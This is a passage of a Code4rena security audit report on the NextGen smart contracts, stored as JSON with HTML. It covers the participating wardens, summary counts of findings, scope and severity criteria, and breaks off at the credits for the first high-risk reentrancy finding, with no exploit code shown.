{
  "circa": {
    "title": "NextGen",
    "sponsor": "NextGen",
    "slug": "2023-10-nextgen",
    "date": "2024-01-08",
    "findings": "https://github.com/code-423n4/2023-10-nextgen-findings/issues",
    "contest": 302
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the NextGen smart contract system written in Solidity. The audit took place between October 30 â€” November 13, 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>256 Wardens contributed reports to NextGen:</p>\n<ol>\n<li><a href=\"https://code4rena.com/@0x3b\">0x3b</a></li>\n<li><a href=\"https://code4rena.com/@AvantGard\">AvantGard</a></li>\n<li><a href=\"https://code4rena.com/@lanrebayode77\">lanrebayode77</a></li>\n<li><a href=\"https://code4rena.com/@Krace\">Krace</a></li>\n<li><a href=\"https://code4rena.com/@immeas\">immeas</a></li>\n<li><a href=\"https://code4rena.com/@ZdravkoHr\">ZdravkoHr</a></li>\n<li><a href=\"https://code4rena.com/@dy\">dy</a></li>\n<li><a href=\"https://code4rena.com/@MrPotatoMagic\">MrPotatoMagic</a></li>\n<li><a href=\"https://code4rena.com/@btk\">btk</a></li>\n<li><a href=\"https://code4rena.com/@7siech\">7siech</a></li>\n<li><a href=\"https://code4rena.com/@dimulski\">dimulski</a></li>\n<li><a href=\"https://code4rena.com/@t0x1c\">t0x1c</a></li>\n<li><a href=\"https://code4rena.com/@degensec\">degensec</a></li>\n<li><a href=\"https://code4rena.com/@KupiaSec\">KupiaSec</a></li>\n<li><a href=\"https://code4rena.com/@Draiakoo\">Draiakoo</a></li>\n<li><a href=\"https://code4rena.com/@oakcobalt\">oakcobalt</a></li>\n<li><a href=\"https://code4rena.com/@Myd\">Myd</a></li>\n<li><a href=\"https://code4rena.com/@VAD37\">VAD37</a></li>\n<li><a href=\"https://code4rena.com/@Haipls\">Haipls</a></li>\n<li><a href=\"https://code4rena.com/@r0ck3tz\">r0ck3tz</a></li>\n<li><a href=\"https://code4rena.com/@The_Kakers\">The_Kakers</a> (<a href=\"https://code4rena.com/@juancito\">juancito</a> and <a href=\"https://code4rena.com/@oxizo\">oxizo</a>)</li>\n<li><a href=\"https://code4rena.com/@gumgumzum\">gumgumzum</a></li>\n<li><a href=\"https://code4rena.com/@nuthan2x\">nuthan2x</a></li>\n<li><a href=\"https://code4rena.com/@trachev\">trachev</a></li>\n<li><a href=\"https://code4rena.com/@0xlemon\">0xlemon</a></li>\n<li><a href=\"https://code4rena.com/@fibonacci\">fibonacci</a></li>\n<li><a href=\"https://code4rena.com/@Noro\">Noro</a></li>\n<li><a href=\"https://code4rena.com/@PetarTolev\">PetarTolev</a></li>\n<li><a href=\"https://code4rena.com/@Udsen\">Udsen</a></li>\n<li><a href=\"https://code4rena.com/@ast3ros\">ast3ros</a></li>\n<li><a href=\"https://code4rena.com/@REKCAH\">REKCAH</a></li>\n<li><a href=\"https://code4rena.com/@00xSEV\">00xSEV</a></li>\n<li><a href=\"https://code4rena.com/@xAriextz\">xAriextz</a></li>\n<li><a href=\"https://code4rena.com/@K42\">K42</a></li>\n<li><a href=\"https://code4rena.com/@xuwinnie\">xuwinnie</a></li>\n<li><a href=\"https://code4rena.com/@alexfilippov314\">alexfilippov314</a></li>\n<li><a href=\"https://code4rena.com/@mrudenko\">mrudenko</a></li>\n<li><a href=\"https://code4rena.com/@DeFiHackLabs\">DeFiHackLabs</a> (<a href=\"https://code4rena.com/@AkshaySrivastav\">AkshaySrivastav</a>, <a href=\"https://code4rena.com/@Cache_and_Burn\">Cache_and_Burn</a>, <a href=\"https://code4rena.com/@IceBear\">IceBear</a>, <a href=\"https://code4rena.com/@Ronin\">Ronin</a>, <a href=\"https://code4rena.com/@Sm4rty\">Sm4rty</a>, <a href=\"https://code4rena.com/@SunSec\">SunSec</a>, <a href=\"https://code4rena.com/@sashik_eth\">sashik_eth</a>, <a href=\"https://code4rena.com/@zuhaibmohd\">zuhaibmohd</a> and <a href=\"https://code4rena.com/@ret2basic\">ret2basic</a>)</li>\n<li><a href=\"https://code4rena.com/@Toshii\">Toshii</a></li>\n<li><a href=\"https://code4rena.com/@JohnnyTime\">JohnnyTime</a></li>\n<li><a href=\"https://code4rena.com/@catellatech\">catellatech</a></li>\n<li><a href=\"https://code4rena.com/@smiling_heretic\">smiling_heretic</a></li>\n<li><a href=\"https://code4rena.com/@Al-Qa-qa\">Al-Qa-qa</a></li>\n<li><a href=\"https://code4rena.com/@Ruhum\">Ruhum</a></li>\n<li><a href=\"https://code4rena.com/@Jiamin\">Jiamin</a></li>\n<li><a href=\"https://code4rena.com/@bart1e\">bart1e</a></li>\n<li><a href=\"https://code4rena.com/@Tadev\">Tadev</a></li>\n<li><a href=\"https://code4rena.com/@rotcivegaf\">rotcivegaf</a></li>\n<li><a href=\"https://code4rena.com/@rahul\">rahul</a></li>\n<li><a href=\"https://code4rena.com/@BugzyVonBuggernaut\">BugzyVonBuggernaut</a></li>\n<li><a href=\"https://code4rena.com/@Stryder\">Stryder</a></li>\n<li><a href=\"https://code4rena.com/@0xblackskull\">0xblackskull</a></li>\n<li><a href=\"https://code4rena.com/@zach\">zach</a></li>\n<li><a href=\"https://code4rena.com/@lsaudit\">lsaudit</a></li>\n<li><a href=\"https://code4rena.com/@SovaSlava\">SovaSlava</a></li>\n<li><a href=\"https://code4rena.com/@Fulum\">Fulum</a></li>\n<li><a href=\"https://code4rena.com/@Juntao\">Juntao</a></li>\n<li><a href=\"https://code4rena.com/@c3phas\">c3phas</a></li>\n<li><a href=\"https://code4rena.com/@JCK\">JCK</a></li>\n<li><a href=\"https://code4rena.com/@thekmj\">thekmj</a></li>\n<li><a href=\"https://code4rena.com/@0xAnah\">0xAnah</a></li>\n<li><a href=\"https://code4rena.com/@rishabh\">rishabh</a></li>\n<li><a href=\"https://code4rena.com/@bird-flu\">bird-flu</a> (<a href=\"https://code4rena.com/@BowTiedOriole\">BowTiedOriole</a> and <a href=\"https://code4rena.com/@bowtiedvirus\">bowtiedvirus</a>)</li>\n<li><a href=\"https://code4rena.com/@CaeraDenoir\">CaeraDenoir</a></li>\n<li><a href=\"https://code4rena.com/@circlelooper\">circlelooper</a></li>\n<li><a href=\"https://code4rena.com/@crunch\">crunch</a></li>\n<li><a href=\"https://code4rena.com/@ustas\">ustas</a></li>\n<li><a href=\"https://code4rena.com/@evmboi32\">evmboi32</a></li>\n<li><a href=\"https://code4rena.com/@peanuts\">peanuts</a></li>\n<li><a href=\"https://code4rena.com/@phoenixV110\">phoenixV110</a></li>\n<li><a href=\"https://code4rena.com/@hunter_w3b\">hunter_w3b</a></li>\n<li><a href=\"https://code4rena.com/@merlin\">merlin</a></li>\n<li><a href=\"https://code4rena.com/@devival\">devival</a></li>\n<li><a href=\"https://code4rena.com/@PENGUN\">PENGUN</a></li>\n<li><a href=\"https://code4rena.com/@twcctop\">twcctop</a></li>\n<li><a href=\"https://code4rena.com/@zhaojie\">zhaojie</a></li>\n<li><a href=\"https://code4rena.com/@Jorgect\">Jorgect</a></li>\n<li><a href=\"https://code4rena.com/@DanielArmstrong\">DanielArmstrong</a></li>\n<li><a href=\"https://code4rena.com/@Eigenvectors\">Eigenvectors</a> (<a href=\"https://code4rena.com/@Cosine\">Cosine</a> and <a href=\"https://code4rena.com/@timo\">timo</a>)</li>\n<li><a href=\"https://code4rena.com/@glcanvas\">glcanvas</a></li>\n<li><a href=\"https://code4rena.com/@niki\">niki</a></li>\n<li><a href=\"https://code4rena.com/@3th\">3th</a></li>\n<li><a href=\"https://code4rena.com/@Kose\">Kose</a></li>\n<li><a href=\"https://code4rena.com/@clara\">clara</a></li>\n<li><a href=\"https://code4rena.com/@SAAJ\">SAAJ</a></li>\n<li><a href=\"https://code4rena.com/@ihtishamsudo\">ihtishamsudo</a></li>\n<li><a href=\"https://code4rena.com/@cats\">cats</a></li>\n<li><a href=\"https://code4rena.com/@digitizeworx\">digitizeworx</a></li>\n<li><a href=\"https://code4rena.com/@funkornaut\">funkornaut</a></li>\n<li><a href=\"https://code4rena.com/@Viktor_Cortess\">Viktor_Cortess</a></li>\n<li><a href=\"https://code4rena.com/@00decree\">00decree</a></li>\n<li><a href=\"https://code4rena.com/@oualidpro\">oualidpro</a></li>\n<li><a href=\"https://code4rena.com/@jacopod\">jacopod</a></li>\n<li><a href=\"https://code4rena.com/@cartlex_\">cartlex_</a></li>\n<li><a href=\"https://code4rena.com/@0xAadi\">0xAadi</a></li>\n<li><a href=\"https://code4rena.com/@Kaysoft\">Kaysoft</a></li>\n<li><a href=\"https://code4rena.com/@Hama\">Hama</a></li>\n<li><a href=\"https://code4rena.com/@Audinarey\">Audinarey</a></li>\n<li><a href=\"https://code4rena.com/@Fitro\">Fitro</a></li>\n<li><a href=\"https://code4rena.com/@AS\">AS</a></li>\n<li><a href=\"https://code4rena.com/@audityourcontracts\">audityourcontracts</a></li>\n<li><a href=\"https://code4rena.com/@Arabadzhiev\">Arabadzhiev</a></li>\n<li><a href=\"https://code4rena.com/@HChang26\">HChang26</a></li>\n<li><a href=\"https://code4rena.com/@SpicyMeatball\">SpicyMeatball</a></li>\n<li><a href=\"https://code4rena.com/@Madalad\">Madalad</a></li>\n<li><a href=\"https://code4rena.com/@openwide\">openwide</a></li>\n<li><a href=\"https://code4rena.com/@epistkr\">epistkr</a></li>\n<li><a href=\"https://code4rena.com/@petrichor\">petrichor</a></li>\n<li><a href=\"https://code4rena.com/@DavidGiladi\">DavidGiladi</a></li>\n<li><a href=\"https://code4rena.com/@0xSolus\">0xSolus</a></li>\n<li><a href=\"https://code4rena.com/@dharma09\">dharma09</a></li>\n<li><a href=\"https://code4rena.com/@hihen\">hihen</a></li>\n<li><a href=\"https://code4rena.com/@leegh\">leegh</a></li>\n<li><a href=\"https://code4rena.com/@tpiliposian\">tpiliposian</a></li>\n<li><a href=\"https://code4rena.com/@cheatc0d3\">cheatc0d3</a></li>\n<li><a href=\"https://code4rena.com/@ZanyBonzy\">ZanyBonzy</a></li>\n<li><a href=\"https://code4rena.com/@pipidu83\">pipidu83</a></li>\n<li><a href=\"https://code4rena.com/@xiao\">xiao</a></li>\n<li><a href=\"https://code4rena.com/@Neon2835\">Neon2835</a></li>\n<li><a href=\"https://code4rena.com/@tnquanghuy0512\">tnquanghuy0512</a></li>\n<li><a href=\"https://code4rena.com/@ayden\">ayden</a></li>\n<li><a href=\"https://code4rena.com/@sces60107\">sces60107</a></li>\n<li><a href=\"https://code4rena.com/@ubl4nk\">ubl4nk</a></li>\n<li><a href=\"https://code4rena.com/@Kow\">Kow</a></li>\n<li><a href=\"https://code4rena.com/@volodya\">volodya</a></li>\n<li><a href=\"https://code4rena.com/@innertia\">innertia</a></li>\n<li><a href=\"https://code4rena.com/@0xarno\">0xarno</a></li>\n<li><a href=\"https://code4rena.com/@Nyx\">Nyx</a></li>\n<li><a href=\"https://code4rena.com/@mojito_auditor\">mojito_auditor</a></li>\n<li><a href=\"https://code4rena.com/@Zac\">Zac</a></li>\n<li><a href=\"https://code4rena.com/@0xMAKEOUTHILL\">0xMAKEOUTHILL</a></li>\n<li><a href=\"https://code4rena.com/@ABA\">ABA</a></li>\n<li><a href=\"https://code4rena.com/@0xSwahili\">0xSwahili</a></li>\n<li><a href=\"https://code4rena.com/@ohm\">ohm</a> (<a href=\"https://code4rena.com/@0x_kmr_\">0x_kmr_</a> and <a href=\"https://code4rena.com/@0x4ka5h\">0x4ka5h</a>)</li>\n<li><a href=\"https://code4rena.com/@0xJuda\">0xJuda</a></li>\n<li><a href=\"https://code4rena.com/@ke1caM\">ke1caM</a></li>\n<li><a href=\"https://code4rena.com/@DarkTower\">DarkTower</a> (<a href=\"https://code4rena.com/@Gelato_ST\">Gelato_ST</a>, <a href=\"https://code4rena.com/@Maroutis\">Maroutis</a>, <a href=\"https://code4rena.com/@OxTenma\">OxTenma</a> and <a href=\"https://code4rena.com/@0xrex\">0xrex</a>)</li>\n<li><a href=\"https://code4rena.com/@codynhat\">codynhat</a></li>\n<li><a href=\"https://code4rena.com/@0xAsen\">0xAsen</a></li>\n<li><a href=\"https://code4rena.com/@TuringConsulting\">TuringConsulting</a> (<a href=\"https://code4rena.com/@0xadrii\">0xadrii</a>, <a href=\"https://code4rena.com/@JosepBove\">JosepBove</a> and <a href=\"https://code4rena.com/@Saintcode_\">Saintcode_</a>)</li>\n<li><a href=\"https://code4rena.com/@Greed\">Greed</a></li>\n<li><a href=\"https://code4rena.com/@0xDetermination\">0xDetermination</a></li>\n<li><a href=\"https://code4rena.com/@NoamYakov\">NoamYakov</a></li>\n<li><a href=\"https://code4rena.com/@Vagner\">Vagner</a></li>\n<li><a href=\"https://code4rena.com/@MaNcHaSsS\">MaNcHaSsS</a></li>\n<li><a href=\"https://code4rena.com/@yojeff\">yojeff</a></li>\n<li><a href=\"https://code4rena.com/@CSL\">CSL</a> (<a href=\"https://code4rena.com/@shaflow2\">shaflow2</a>, <a href=\"https://code4rena.com/@steadyman\">steadyman</a>, <a href=\"https://code4rena.com/@levi_104\">levi_104</a> and <a href=\"https://code4rena.com/@BY_DLIFE\">BY_DLIFE</a>)</li>\n<li><a href=\"https://code4rena.com/@Valix\">Valix</a> (<a href=\"https://code4rena.com/@0x8e88\">0x8e88</a>, <a href=\"https://code4rena.com/@merlinboii\">merlinboii</a>, <a href=\"https://code4rena.com/@JokerStudio\">JokerStudio</a> and <a href=\"https://code4rena.com/@62theories\">62theories</a>)</li>\n<li><a href=\"https://code4rena.com/@NentoR\">NentoR</a></li>\n<li><a href=\"https://code4rena.com/@Talfao\">Talfao</a></li>\n<li><a href=\"https://code4rena.com/@0xpiken\">0xpiken</a></li>\n<li><a href=\"https://code4rena.com/@flacko\">flacko</a></li>\n<li><a href=\"https://code4rena.com/@Soul22\">Soul22</a></li>\n<li><a href=\"https://code4rena.com/@rvierdiiev\">rvierdiiev</a></li>\n<li><a href=\"https://code4rena.com/@0xhunter\">0xhunter</a></li>\n<li><a href=\"https://code4rena.com/@nmirchev8\">nmirchev8</a></li>\n<li><a href=\"https://code4rena.com/@0xWaitress\">0xWaitress</a></li>\n<li><a href=\"https://code4rena.com/@ChrisTina\">ChrisTina</a></li>\n<li><a href=\"https://code4rena.com/@_eperezok\">_eperezok</a></li>\n<li><a href=\"https://code4rena.com/@xeros\">xeros</a></li>\n<li><a href=\"https://code4rena.com/@bdmcbri\">bdmcbri</a></li>\n<li><a href=\"https://code4rena.com/@Bauchibred\">Bauchibred</a></li>\n<li><a href=\"https://code4rena.com/@alexxander\">alexxander</a></li>\n<li><a href=\"https://code4rena.com/@bronze_pickaxe\">bronze_pickaxe</a></li>\n<li><a href=\"https://code4rena.com/@Tricko\">Tricko</a></li>\n<li><a href=\"https://code4rena.com/@0x180db\">0x180db</a></li>\n<li><a href=\"https://code4rena.com/@amaechieth\">amaechieth</a></li>\n<li><a href=\"https://code4rena.com/@cu5t0mpeo\">cu5t0mpeo</a></li>\n<li><a href=\"https://code4rena.com/@Delvir0\">Delvir0</a></li>\n<li><a href=\"https://code4rena.com/@0x_6a70\">0x_6a70</a></li>\n<li><a href=\"https://code4rena.com/@Ocean_Sky\">Ocean_Sky</a></li>\n<li><a href=\"https://code4rena.com/@spark\">spark</a></li>\n<li><a href=\"https://code4rena.com/@BugsFinder0x\">BugsFinder0x</a></li>\n<li><a href=\"https://code4rena.com/@Taylor_Webb\">Taylor_Webb</a></li>\n<li><a href=\"https://code4rena.com/@Timenov\">Timenov</a></li>\n<li><a href=\"https://code4rena.com/@sl1\">sl1</a></li>\n<li><a href=\"https://code4rena.com/@droptpackets\">droptpackets</a></li>\n<li><a href=\"https://code4rena.com/@seeques\">seeques</a></li>\n<li><a href=\"https://code4rena.com/@pontifex\">pontifex</a></li>\n<li><a href=\"https://code4rena.com/@836541\">836541</a></li>\n<li><a href=\"https://code4rena.com/@ilchovski\">ilchovski</a></li>\n<li><a href=\"https://code4rena.com/@Aymen0909\">Aymen0909</a></li>\n<li><a href=\"https://code4rena.com/@0xraion\">0xraion</a></li>\n<li><a href=\"https://code4rena.com/@0x175\">0x175</a></li>\n<li><a href=\"https://code4rena.com/@stackachu\">stackachu</a></li>\n<li><a href=\"https://code4rena.com/@Neo_Granicen\">Neo_Granicen</a></li>\n<li><a href=\"https://code4rena.com/@EricWWFCP\">EricWWFCP</a></li>\n<li><a href=\"https://code4rena.com/@0xAlix2\">0xAlix2</a> (<a href=\"https://code4rena.com/@a_kalout\">a_kalout</a> and <a href=\"https://code4rena.com/@ali_shehab\">ali_shehab</a>)</li>\n<li><a href=\"https://code4rena.com/@kk_krish\">kk_krish</a></li>\n<li><a href=\"https://code4rena.com/@turvy_fuzz\">turvy_fuzz</a></li>\n<li><a href=\"https://code4rena.com/@Beosin\">Beosin</a></li>\n<li><a href=\"https://code4rena.com/@critical-or-high\">critical-or-high</a></li>\n<li><a href=\"https://code4rena.com/@joesan\">joesan</a></li>\n<li><a href=\"https://code4rena.com/@y4y\">y4y</a></li>\n<li><a href=\"https://code4rena.com/@danielles0xG\">danielles0xG</a></li>\n<li><a href=\"https://code4rena.com/@jasonxiale\">jasonxiale</a></li>\n<li><a href=\"https://code4rena.com/@ciphermarco\">ciphermarco</a></li>\n<li><a href=\"https://code4rena.com/@Inference\">Inference</a></li>\n<li><a href=\"https://code4rena.com/@slvDev\">slvDev</a></li>\n<li><a href=\"https://code4rena.com/@0xgrbr\">0xgrbr</a></li>\n<li><a href=\"https://code4rena.com/@0xMango\">0xMango</a></li>\n<li><a href=\"https://code4rena.com/@inzinko\">inzinko</a></li>\n<li><a href=\"https://code4rena.com/@Silvermist\">Silvermist</a></li>\n<li><a href=\"https://code4rena.com/@mahyar\">mahyar</a></li>\n<li><a href=\"https://code4rena.com/@dethera\">dethera</a></li>\n<li><a href=\"https://code4rena.com/@Zach_166\">Zach_166</a></li>\n<li><a href=\"https://code4rena.com/@0x656c68616a\">0x656c68616a</a></li>\n<li><a href=\"https://code4rena.com/@aslanbek\">aslanbek</a></li>\n<li><a href=\"https://code4rena.com/@tallo\">tallo</a></li>\n<li><a href=\"https://code4rena.com/@darksnow\">darksnow</a></li>\n<li><a href=\"https://code4rena.com/@cccz\">cccz</a></li>\n<li><a href=\"https://code4rena.com/@cryptothemex\">cryptothemex</a></li>\n<li><a href=\"https://code4rena.com/@blutorque\">blutorque</a></li>\n<li><a href=\"https://code4rena.com/@vangrim\">vangrim</a></li>\n<li><a href=\"https://code4rena.com/@c0pp3rscr3w3r\">c0pp3rscr3w3r</a></li>\n<li><a href=\"https://code4rena.com/@yobiz\">yobiz</a></li>\n<li><a href=\"https://code4rena.com/@shenwilly\">shenwilly</a></li>\n<li><a href=\"https://code4rena.com/@Oxsadeeq\">Oxsadeeq</a></li>\n<li><a href=\"https://code4rena.com/@aldarion\">aldarion</a></li>\n<li><a href=\"https://code4rena.com/@Norah\">Norah</a></li>\n<li><a href=\"https://code4rena.com/@0xsagetony\">0xsagetony</a></li>\n<li><a href=\"https://code4rena.com/@ak1\">ak1</a></li>\n<li><a href=\"https://code4rena.com/@TermoHash\">TermoHash</a></li>\n<li><a href=\"https://code4rena.com/@orion\">orion</a></li>\n<li><a href=\"https://code4rena.com/@Shubham\">Shubham</a></li>\n<li><a href=\"https://code4rena.com/@8olidity\">8olidity</a></li>\n<li><a href=\"https://code4rena.com/@max10afternoon\">max10afternoon</a></li>\n<li><a href=\"https://code4rena.com/@kimchi\">kimchi</a></li>\n<li><a href=\"https://code4rena.com/@0xMosh\">0xMosh</a></li>\n<li><a href=\"https://code4rena.com/@Deft_TT\">Deft_TT</a></li>\n<li><a href=\"https://code4rena.com/@0xAleko\">0xAleko</a></li>\n<li><a href=\"https://code4rena.com/@AerialRaider\">AerialRaider</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://code4rena.com/@0xsomeone\">0xsomeone</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/brittfactorC4\">thebrittfactor</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 14 unique vulnerabilities. Of these vulnerabilities, 5 received a risk rating in the category of HIGH severity and 12 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 29 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 19 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-10-nextgen\">C4 NextGen repository</a>, and is composed of 8 smart contracts written in the Solidity programming language and includes 1265 lines of Solidity code.</p>\n<p>In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, <strong>Hound</strong> from warden DadeKuma, generated the <a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a\">Automated Findings report</a> and all findings therein were classified as out of scope.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-5\" style=\"position:relative;\"><a href=\"#high-risk-findings-5\" aria-label=\"high risk findings 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (5)</h1>\n<h2 id=\"h-01-attacker-can-reenter-to-mint-all-the-collection-supply\" style=\"position:relative;\"><a href=\"#h-01-attacker-can-reenter-to-mint-all-the-collection-supply\" aria-label=\"h 01 attacker can reenter to mint all the collection supply permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517\">[H-01] Attacker can reenter to mint all the collection supply</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517\">btk</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2049\">sl1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2011\">836541</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1947\">alexxander</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1928\">ilchovski</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1877\">Kose</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1859\">pontifex</a>, PetarTolev (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1857\">1</a>, <a 